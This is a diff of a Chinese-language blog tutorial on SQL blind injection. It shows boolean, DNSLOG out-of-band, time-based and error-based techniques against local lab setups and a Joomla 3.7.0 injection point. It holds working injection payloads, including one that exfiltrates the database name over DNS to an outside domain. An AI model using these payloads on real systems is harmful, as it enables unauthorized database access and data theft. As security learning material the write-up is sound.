@@ -23,10 +23,22 @@
 <meta property="og:site_name" content="KarmA @ D0g3">
 <meta property="og:description" content="总结一下自己应对SQL Injection盲注的姿势与和对原理的理解。">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-06-03T08:46:31.708Z">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1fs8cr9zofsj31kw13sgya.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1fs7ofn9c10j31kw10snib.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79ly1fsargvznkvj31kw06s0tk.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fsarj48u1sj31kw06gq3v.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79ly1fsark59cs3j31kw03adgk.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fsatxngbz8j31kw06o756.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fsascrioxmj31kw037q3n.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcly1fs8gwf1c1ij312a0ekjs6.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1fs8ge0tid7j316g0fcmy0.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcly1fs8ghvs1vij30lo0dm0tv.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcly1fs8h4y3tdbj317q098dgh.jpg">
+<meta property="og:updated_time" content="2018-06-14T09:29:52.376Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="浅谈SQL盲注">
 <meta name="twitter:description" content="总结一下自己应对SQL Injection盲注的姿势与和对原理的理解。">
+<meta name="twitter:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1fs8cr9zofsj31kw13sgya.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -290,14 +302,105 @@
 <p>总结一下自己应对SQL Injection盲注的姿势与和对原理的理解。<a id="more"></a></p>
 <the rest="" of="" contents="" |="" 余下全文="">
 
-<h2 id="BooleanBase"><a href="#BooleanBase" class="headerlink" title="BooleanBase"></a>BooleanBase</h2><h3 id="常用姿势"><a href="#常用姿势" class="headerlink" title="常用姿势"></a>常用姿势</h3><h3 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h3><h4 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h4><h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><h3 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h3><h4 id="原理解析-1"><a href="#原理解析-1" class="headerlink" title="原理解析"></a>原理解析</h4><p>一开始自己搭建测试环境的时候遇到各种玄学问题……</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">如何查看mysql是否开启了文件导入导出？</span><br><span class="line">mysql&gt;show global variables like &apos;%secure%&apos;;</span><br><span class="line">如果secure_file_priv的值为null，则没开启；如果为空，则开启；如果为目录，则说明只能在该目录下操作。</span><br><span class="line"></span><br><span class="line">如何修改secure_file_priv？</span><br><span class="line">windows下：修改my.ini 在[mysqld]内加入secure_file_priv =</span><br><span class="line">linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =</span><br><span class="line">MYSQL新特性secure_file_priv对读写文件的影响</span><br><span class="line">然后重启mysql，再查询secure_file_priv</span><br></pre></td></tr></table></figure>
-<p>结果改了secure_file_priv后一样没有结果。。但是ping的时候是有结果的。于是就继续找mysql配置的问题。。然后后来。。不明觉厉的就好了！！就很懵逼！！</p>
-<h4 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h4><p><strong>参考资料</strong></p>
+<p>本文所有实战盲注例子，均来自<a href="https://www.exploit-db.com/exploits/42033/" target="_blank" rel="noopener">Joomla! 3.7.0 - ‘com_fields’ SQL Injection</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">由于篇幅有限，本文就不去剖析漏洞原理，直接告知payload插入点，来展现盲注的用法（如有需要可自行寻找各方大佬的研究文章）</span><br><span class="line">注入点：</span><br><span class="line">http://localhost/Joomla/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=[payload]</span><br></pre></td></tr></table></figure>
+<h2 id="BooleanBase"><a href="#BooleanBase" class="headerlink" title="BooleanBase"></a>BooleanBase</h2><h3 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h3><p><strong>优点：</strong></p>
+<p>​    1.比遍历穷举快</p>
+<p><strong>缺点：</strong></p>
+<p>​    1.容易被封ip</p>
+<p>​    2.速度慢</p>
+<h4 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h4><p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fs8cr9zofsj31kw13sgya.jpg" alt=""></p>
+<blockquote>
+<p>常用函数：</p>
+<p>left(x,y)     // 从x的最左侧开始截取前y位</p>
+<p>ascii(substr((sql),1,1))=num    // 从sql语句返回的字符串的第一位开始，截取字符串的一长度，将其转换成ascii编码，然后与num比较</p>
+<p>ord(mid((sql),1,1))=num // ord()==ascii()</p>
+<p>regexp ‘^[a-z]’    // 在某些情况下，用正则表达式还是很方便的！</p>
+</blockquote>
+<p>最后只需要将手工测试的过程转换成python用代码自动化实现</p>
+<h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><h3 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h3><p><strong>优点：</strong></p>
+<p>​    1.简单，不需要像二分法一样繁琐地一个个遍历</p>
+<p>​    2.快速（相对于二分法而言）</p>
+<p><strong>缺点：</strong></p>
+<p>​    1.局限于Windows环境下（UNC路径）</p>
+<p>​    2.Mysql版本&gt;=5.5.53就要检查Secure_file_priv这个全局变量是否为空（若为NULL，则不可用，<a href="https://xz.aliyun.com/t/2293" target="_blank" rel="noopener">详见</a>）</p>
+<h4 id="原理解析-1"><a href="#原理解析-1" class="headerlink" title="原理解析"></a>原理解析</h4><p>找了国外的<a href="https://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf" target="_blank" rel="noopener">paper</a>研究了一波，不懂的就来一波疯狂乱查，然后拿个小本本记下来～～</p>
+<p>虽然大概明白是个什么意思，但是计网的dns知识（明年这个时候才学），我。。。有点晕～</p>
+<p>然后自己似懂非懂地画了张利用dnslog进行sql盲注的原理流程图，如有不对，感谢各位大佬指正：</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fs7ofn9c10j31kw10snib.jpg" alt=""></p>
+<blockquote>
+<p>UNC路径：UNC为网络（主要指局域网）上资源的完整Windows 2000名称。<br>格式：\servername\sharename，其中servername是服务器名。sharename是共享资源的名称。<br>目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename。（转自百度）</p>
+<p>所以payload里面的四个’\\\\‘和两个’\\\’经过转义后再通过concat函数拼接，就形成了<strong>\\test.karmaof.me\123</strong>的UNC路径。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">?id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.karmaof.me\\123&apos;))),1,1)--+</span><br></pre></td></tr></table></figure>
+<p>一开始自己搭建测试环境的时候遇到各种玄学问题……</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">如何查看mysql是否开启了文件导入导出？</span><br><span class="line">mysql&gt;show global variables like &apos;%secure%&apos;;</span><br><span class="line">如果secure_file_priv的值为null，则没开启；如果为空，则开启；如果为目录，则说明只能在该目录下操作。</span><br><span class="line"></span><br><span class="line">如何修改secure_file_priv？</span><br><span class="line">windows下：修改my.ini 在[mysqld]内加入secure_file_priv =</span><br><span class="line">linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =</span><br><span class="line">MYSQL新特性secure_file_priv对读写文件的影响</span><br><span class="line">然后重启mysql，再查询secure_file_priv，为空，则已经设置好了。</span><br></pre></td></tr></table></figure>
+<h4 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h4><p>源码的$query里面带了一层mysqli的escape函数对单双引号等字符进行转义，所以对于dnslog的复现不是很有利，所以我就把过滤去掉了。</p>
+<p>但是实践的时候又发现了问题：</p>
+<p>查询是正常的，但是，并没有解析到dns记录</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fsargvznkvj31kw06s0tk.jpg" alt=""></p>
+<p>然后就做了个愚蠢的试验：</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fsarj48u1sj31kw06gq3v.jpg" alt=""></p>
+<p>配合报错注入里面的查询，却可以解析到dns记录</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fsark59cs3j31kw03adgk.jpg" alt=""></p>
+<p>后来看到作者用sqlmap跑的payload（DUAL表是一张虚拟表），发现用了一波case when，然后一样可以得到dns记录</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fsatxngbz8j31kw06o756.jpg" alt=""></p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fsascrioxmj31kw037q3n.jpg" alt=""></p>
+<p>但是这里有个疑问就是，尽管后面的句子不会执行，但是else后面的语句一定要加union查询，不加的话，是截获不了dns记录的（估计审一波代码就可以知道为什么了<strong>:)</strong> ）</p>
+<p>所以就去搜了一波 <strong>CASE WHEN</strong> 然后发现它又是一个功能比较强大的东东:)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"># 官方定义：</span><br><span class="line">CASE expression</span><br><span class="line">    WHEN condition1 THEN result1</span><br><span class="line">    WHEN condition2 THEN result2</span><br><span class="line">   ...</span><br><span class="line">    WHEN conditionN THEN resultN</span><br><span class="line">    ELSE result</span><br><span class="line">END</span><br><span class="line"></span><br><span class="line"># 总结来说：case when 有两种用法，类似于C语言的 swicth case</span><br><span class="line"># 简单判断版</span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+--------+</span><br><span class="line">| id | username | passwd |</span><br><span class="line">+----+----------+--------+</span><br><span class="line">|  1 | admin    | admin  |</span><br><span class="line">|  2 | KarmA    | KarmA  |</span><br><span class="line">+----+----------+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select</span><br><span class="line">    -&gt;  ( case when users.id = 1 then users.username</span><br><span class="line">    -&gt;          when users.id = 2 then users.username</span><br><span class="line">    -&gt;  else 0 end) as username2 from users;</span><br><span class="line">+-----------+</span><br><span class="line">| username2 |</span><br><span class="line">+-----------+</span><br><span class="line">| admin     |</span><br><span class="line">| KarmA     |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line"># 搜索版</span><br><span class="line"># when 后面可以接任意判断表达式，then 后面就是true的时候执行的语句</span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+--------+</span><br><span class="line">| id | username | passwd |</span><br><span class="line">+----+----------+--------+</span><br><span class="line">|  1 | admin    | admin  |</span><br><span class="line">|  2 | KarmA    | KarmA  |</span><br><span class="line">+----+----------+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select</span><br><span class="line">    -&gt;  ( case when users.id = 1 then users.username</span><br><span class="line">    -&gt;          when users.id = 2 then users.username</span><br><span class="line">    -&gt;  else 0</span><br><span class="line">    -&gt;  end) as username2 from users;</span><br><span class="line">+-----------+</span><br><span class="line">| username2 |</span><br><span class="line">+-----------+</span><br><span class="line">| admin     |</span><br><span class="line">| KarmA     |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>
+<p><strong>参考资料</strong></p>
 <p><a href="https://err0rzz.github.io/2017/11/16/OOB%E6%B3%A8%E5%85%A5/#" target="_blank" rel="noopener">OBB注入</a></p>
 <p><a href="http://blog.merl1ng.cc/2018/03/02/dnslog%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">DNSLOG利用</a></p>
 <p><a href="https://ricterz.me/posts/%E7%AC%94%E8%AE%B0%3A%20Data%20Retrieval%20over%20DNS%20in%20SQL%20Injection%20Attacks" target="_blank" rel="noopener">笔记: Data Retrieval over DNS in SQL Injection Attacks</a></p>
-<h2 id="TimeBase"><a href="#TimeBase" class="headerlink" title="TimeBase"></a>TimeBase</h2><h2 id="ErrorBase"><a href="#ErrorBase" class="headerlink" title="ErrorBase"></a>ErrorBase</h2></the></excerpt>
+<h2 id="TimeBase"><a href="#TimeBase" class="headerlink" title="TimeBase"></a>TimeBase</h2><p>前段时间看到<a href="https://mp.weixin.qq.com/s/bDeztHrOF2S6wf_nBFVeOg" target="_blank" rel="noopener">do9gy@长亭科技</a>大佬发的一篇文章，就赶紧学一波新型盲注技巧</p>
+<h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sleep(5);</span><br><span class="line">+----------+</span><br><span class="line">| sleep(5) |</span><br><span class="line">+----------+</span><br><span class="line">|        0 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (5.00 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark()"></a>benchmark()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select benchmark(1000000,sha(1));</span><br><span class="line">+---------------------------+</span><br><span class="line">| benchmark(1000000,sha(1)) |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                         0 |</span><br><span class="line">+---------------------------+</span><br><span class="line">1 row in set (0.39 sec)</span><br></pre></td></tr></table></figure>
+<p>不推荐使用</p>
+<h3 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h3><p>（这是一个线代的概念？？我怎么好像没有印象了……）</p>
+<blockquote>
+<p>百度一波：</p>
+<p><strong>笛卡尔</strong>乘积是指在数学中，两个集合X和Y的<strong>笛</strong>卡尓<strong>积</strong>（Cartesian product），又称直<strong>积</strong>，表示为X × Y，第一个对象是X的成员而第二个对象是Y的所有可能有序对的其中一个成员 。</p>
+</blockquote>
+<p>为了防止表明重复可能导致不必要的错误，所以一般都会用表别名来区别：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 337801632 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (6.19 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="get-lock"><a href="#get-lock" class="headerlink" title="get_lock()"></a>get_lock()</h3><p>这个只演示原理吧，虽然延时精准，但是利用条件也很苛刻～～(需要使用 <strong>mysql_pconnect</strong>函数来连接数据库)</p>
+<p>session 1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&apos;karma&apos;,1);</span><br><span class="line">+---------------------+</span><br><span class="line">| get_lock(&apos;karma&apos;,1) |</span><br><span class="line">+---------------------+</span><br><span class="line">|                   1 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>session 2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&apos;karma&apos;,10);</span><br><span class="line">+----------------------+</span><br><span class="line">| get_lock(&apos;karma&apos;,10) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    0 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (10.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p><strong>参考资料</strong></p>
+<p><a href="https://www.cdxy.me/?p=789" target="_blank" rel="noopener">MySQL时间盲注五种延时方法 (PWNHUB 非预期解)</a></p>
+<h2 id="ErrorBase"><a href="#ErrorBase" class="headerlink" title="ErrorBase"></a>ErrorBase</h2><h3 id="floor-count-group-by"><a href="#floor-count-group-by" class="headerlink" title="floor()+count()+group by"></a>floor()+count()+group by</h3><p>（万能）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:http://localhost/sqli/less-5/</span><br><span class="line">?id=1&apos; and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:http://localhost/sqli/less-1/</span><br><span class="line">?id=1&apos; and exp(~(select * from (select database() ) a) );--+</span><br></pre></td></tr></table></figure>
+<h3 id="bigint"><a href="#bigint" class="headerlink" title="bigint"></a>bigint</h3><p>(Mysql Version &gt;=5.4.45)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:http://localhost/sqli/less-1/</span><br><span class="line">?id=1&apos; and !(select*from(select user())x)-~0-- -</span><br></pre></td></tr></table></figure>
+<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>(Mysql Version &gt;=5.1.5)</p>
+<p>与updatexml类似</p>
+<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p>(Mysql Version &gt;=5.1.5)</p>
+<p><strong>updatexml最多只能显示32位，超过长度可以配合substr()</strong></p>
+<blockquote>
+<p>UpdateXML(xml_target, xpath_expr, new_xml)</p>
+<p>第一个参数是含xml文档格式的字符串</p>
+<p>第二个参数是xpath表达式，我们就是在这个参数上作文章:)</p>
+<p>第三个是需要替换成的xptah表达式</p>
+</blockquote>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fs8gwf1c1ij312a0ekjs6.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:http://localhost/sqli/less-1/</span><br><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+<h3 id="name-const"><a href="#name-const" class="headerlink" title="name_const()"></a>name_const()</h3><blockquote>
+<p>NAME_CONST(<em>name</em>,<em>value</em>)</p>
+<p>生成名为name的列，并把value赋值过去，如果存在</p>
+</blockquote>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fs8ge0tid7j316g0fcmy0.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:http://localhost/sqli/less-1/</span><br><span class="line">?id=1&apos; union select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;--+</span><br></pre></td></tr></table></figure>
+<p>重点标注的x可以换成其他字母，但是不能不填以及填数字。<em>Every derived table must have its own alias</em>不填会报错table需要别名。后来本地测试了一下：</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fs8ghvs1vij30lo0dm0tv.jpg" width="50%"></p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fs8h4y3tdbj317q098dgh.jpg" width="50%"></p>
+<p>就明白为什么了！</p>
+<p><strong>参考资料</strong></p>
+<p><a href="https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/" target="_blank" rel="noopener">Error Based SQL Injection Using EXP</a></p>
+<p><a href="https://osandamalith.com/2015/07/08/bigint-overflow-error-based-sql-injection/" target="_blank" rel="noopener">BIGINT Overflow Error Based SQL Injection</a></p>
+</the></excerpt>
       
     </div>
     
@@ -308,7 +411,7 @@
         <p><span>Title:</span><a href="/2018/04/05/sql-blind/">浅谈SQL盲注</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage">KarmA</a></p>
         <p><span>Created:</span>2018-04-05, 21:55:48</p>
-        <p><span>Updated:</span>2018-06-03, 16:46:31</p>
+        <p><span>Updated:</span>2018-06-14, 17:29:52</p>
         <p>
             <span>Full URL:</span><a class="post-url" href="/2018/04/05/sql-blind/" title="浅谈SQL盲注">http://blog.karmaof.me/2018/04/05/sql-blind/</a>
             <span class="copy-path" data-clipboard-text="From http://blog.karmaof.me/2018/04/05/sql-blind/　　By KarmA" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
@@ -344,7 +447,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BooleanBase"><span class="toc-text">BooleanBase</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用姿势"><span class="toc-text">常用姿势</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二分法"><span class="toc-text">二分法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理解析"><span class="toc-text">原理解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实战"><span class="toc-text">实战</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSLOG"><span class="toc-text">DNSLOG</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理解析-1"><span class="toc-text">原理解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实战-1"><span class="toc-text">实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TimeBase"><span class="toc-text">TimeBase</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ErrorBase"><span class="toc-text">ErrorBase</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BooleanBase"><span class="toc-text">BooleanBase</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#二分法"><span class="toc-text">二分法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理解析"><span class="toc-text">原理解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实战"><span class="toc-text">实战</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSLOG"><span class="toc-text">DNSLOG</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理解析-1"><span class="toc-text">原理解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实战-1"><span class="toc-text">实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TimeBase"><span class="toc-text">TimeBase</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep"><span class="toc-text">sleep()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#benchmark"><span class="toc-text">benchmark()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#笛卡尔积"><span class="toc-text">笛卡尔积</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-lock"><span class="toc-text">get_lock()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ErrorBase"><span class="toc-text">ErrorBase</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#floor-count-group-by"><span class="toc-text">floor()+count()+group by</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bigint"><span class="toc-text">bigint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue"><span class="toc-text">extractvalue()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml"><span class="toc-text">updatexml()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#name-const"><span class="toc-text">name_const()</span></a></li></ol></li></ol>
         
     </div>
     <style>
